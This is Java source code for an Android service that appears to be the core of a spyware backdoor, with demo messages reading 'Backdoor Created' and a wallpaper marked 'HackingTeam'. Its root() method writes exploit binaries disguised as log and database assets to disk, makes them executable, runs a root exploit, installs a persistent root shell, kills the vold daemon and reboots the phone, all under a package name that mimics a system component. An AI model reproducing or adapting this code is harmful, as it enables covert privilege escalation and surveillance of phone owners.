package com.android.service;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

import android.app.Service;
import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.os.IBinder;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import android.widget.Toast;

import com.android.service.auto.Cfg;
import com.android.service.util.Utils;

/**
 * The Class ServiceCore.
 */
public class ServiceCore extends Service {
	private static final String TAG = "ServiceCore";

	private Core core;
	private String shellFile;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		if (Cfg.DEBUG){
			Log.d("QZ", TAG + " (onCreate)");
		}
		if(Cfg.DEMO){
			Toast.makeText(this, "Backdoor Created", Toast.LENGTH_LONG).show();
			//setBackground();
		}
		Status.setAppContext(getApplicationContext());
	}

	private void setBackground() {
		WallpaperManager wm = WallpaperManager.getInstance(this);
		Display display = ((WindowManager) Status.getAppContext()
				.getSystemService(Context.WINDOW_SERVICE))
				.getDefaultDisplay();
		int width = display.getWidth();
		int height = display.getHeight();
		Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
		Canvas canvas = new Canvas(bitmap);
		Paint paint=new Paint();
		paint.setStyle(Paint.Style.FILL);
		paint.setAntiAlias(true);
		paint.setTextSize(20);
		canvas.drawText("HackingTeam", 10, 100, paint);
		try {
			wm.setBitmap(bitmap);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		if (Cfg.DEBUG)
			Log.d("QZ", TAG + " (onDestroy)");

		if(Cfg.DEMO)
			Toast.makeText(this, "Backdoor Destroyed", Toast.LENGTH_LONG).show();
		core.Stop();
		core = null;
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);

		this.shellFile = "rdb";

		if (checkRoot() == true) {
			Status.self().setRoot(true);
		} else {
			Status.self().setRoot(false);

			// Don't exploit if we have no SD card mounted
			if (android.os.Environment.getExternalStorageState().equals(
					android.os.Environment.MEDIA_MOUNTED)) {
				Status.self().setRoot(root());
			} else {
				if (Cfg.DEBUG)
					Log.d("QZ", TAG + " (onStart) no media mounted");
			}
		}

		// Core starts
		core = new Core();
		core.Start(this.getResources(), getContentResolver());
		
	}

	private boolean root() {
		try {
			if (!Cfg.EXP) {
				if (Cfg.DEBUG)
					Log.d("QZ", TAG + " (root): Exploit disabled by conf");

				return false;
			}

			String crashlog = "errorlog";
			String exploit = "statuslog";
			String suidext = "statusdb";
			boolean isRoot = false;

			// Creiamo il crashlog
			FileOutputStream fos = getApplicationContext().openFileOutput(
					crashlog, MODE_PRIVATE);
			fos.close();

			// Scriviamo l'exploit sul disco
			InputStream is = getAssets().open(exploit);

			byte[] content = new byte[is.available()];
			is.read(content);
			is.close();

			FileOutputStream fsexpl = openFileOutput(exploit, MODE_PRIVATE);
			fsexpl.write(content);
			fsexpl.close();

			// scriviamo suidext su disco
			is = getAssets().open(suidext);

			content = new byte[is.available()];
			is.read(content);
			is.close();

			FileOutputStream fsext = openFileOutput(suidext, MODE_PRIVATE);
			fsext.write(content);
			fsext.close();

			// Eseguiamo l'exploit
			File filesPath = getApplicationContext().getFilesDir();
			String path = filesPath.getAbsolutePath();

			Runtime.getRuntime().exec(
					"/system/bin/chmod 755 " + path + "/" + exploit);
			Runtime.getRuntime().exec(
					"/system/bin/chmod 755 " + path + "/" + suidext);
			Runtime.getRuntime().exec(
					"/system/bin/chmod 666 " + path + "/" + crashlog);

			final String exppath = path + "/" + exploit;

			ExploitRunnable r = new ExploitRunnable(exppath);
			new Thread(r).start();

			// Attendiamo al max 100 secondi il nostro file setuid root
			long now = System.currentTimeMillis();

			while (System.currentTimeMillis() - now < 100 * 1000) {
				Utils.sleep(1000);

				if (checkRoot()) {
					isRoot = true;
					break;
				}
			}

			if (r.getProcess() != null)
				r.getProcess().destroy();

			if (isRoot) {
				// Killiamo VOLD per due volte
				Runtime.getRuntime().exec(path + "/" + suidext + " vol");

				// Installiamo la shell root
				Runtime.getRuntime().exec(path + "/" + suidext + " rt");

				if (Cfg.DEBUG) {
					Log.d("QZ", TAG + " (onStart): Root exploit");
				}
				if (Cfg.DEMO) {
					Toast.makeText(this, "Root exploit", Toast.LENGTH_LONG)
							.show();
				}

				// Riavviamo il telefono
				Runtime.getRuntime().exec(path + "/" + suidext + " reb");
			} else {
				if (Cfg.DEBUG) {
					Log.d("QZ", TAG + " (onStart): exploit failed!");
				}
				if (Cfg.DEMO) {
					Toast.makeText(this, "exploit failed!", Toast.LENGTH_LONG)
							.show();
				}

			}
		} catch (Exception e1) {

			if (Cfg.DEBUG) {
				e1.printStackTrace();
				Log.d("QZ", TAG + " (root): Exception on root()");
			}
			return false;
		}

		return true;
	}

	private boolean checkRoot() {
		try {
			getApplicationContext().openFileInput(shellFile);
		} catch (FileNotFoundException f) {
			return false;
		}

		return true;
	}

	// Exploit thread
	class ExploitRunnable implements Runnable {
		private Process localProcess;
		private String exppath;

		public ExploitRunnable(String exppath) {
			this.exppath = exppath;
		}

		public Process getProcess() {
			return localProcess;
		}

		public void run() {
			try {
				localProcess = Runtime.getRuntime().exec(exppath);

				BufferedWriter stdin = new BufferedWriter(
						new OutputStreamWriter(localProcess.getOutputStream()));
				BufferedReader stdout = new BufferedReader(
						new InputStreamReader(localProcess.getInputStream()));
				BufferedReader stderr = new BufferedReader(
						new InputStreamReader(localProcess.getErrorStream()));
				String full = null;
				String line = null;

				while ((line = stdout.readLine()) != null) {
					if (Cfg.DEBUG) {
						Log.d("QZ", TAG + " (stdout): " + line);
					}
				}

				while ((line = stderr.readLine()) != null) {
					if (Cfg.DEBUG) {
						Log.d("QZ", TAG + " (stderr): " + line);
					}
				}

				try {
					localProcess.waitFor();
				} catch (InterruptedException e) {
					if (Cfg.DEBUG) {
						Log.d("QZ", TAG + " (waitFor): " + e);
						e.printStackTrace();
					}
				}

				int exitValue = localProcess.exitValue();
				if (Cfg.DEBUG)
					Log.d("QZ", TAG + " (waitFor): exitValue " + exitValue);

				stdin.close();
				stdout.close();
				stderr.close();

			} catch (IOException e) {
				localProcess = null;
				if (Cfg.DEBUG) {
					Log.d("QZ", TAG
							+ " (ExploitRunnable): Exception on run(): " + e);
					e.printStackTrace();
				}
			}
		}

	};
}
